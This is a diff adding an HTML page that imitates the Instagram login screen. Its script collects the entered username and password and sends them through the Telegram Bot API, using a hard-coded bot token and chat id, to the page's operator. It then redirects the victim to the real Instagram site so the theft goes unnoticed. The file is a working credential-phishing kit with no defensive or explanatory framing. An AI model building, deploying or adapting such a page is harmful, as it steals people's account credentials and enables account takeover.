@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1 style="font-style: italic;">Instagram</h1>
+        <input type="text" id="user" placeholder="Phone number, username, or email">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="sendData()">Log In</button>
+    </div>
+
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
+
+        async function sendData() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const text = `🔑 Instagram Login:\n👤 User: ${user}\n🔐 Pass: ${pass}`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(text)}`);
+            window.location.href = "https://www.instagram.com";
+        }
+    </script>
+</body>
+</html>
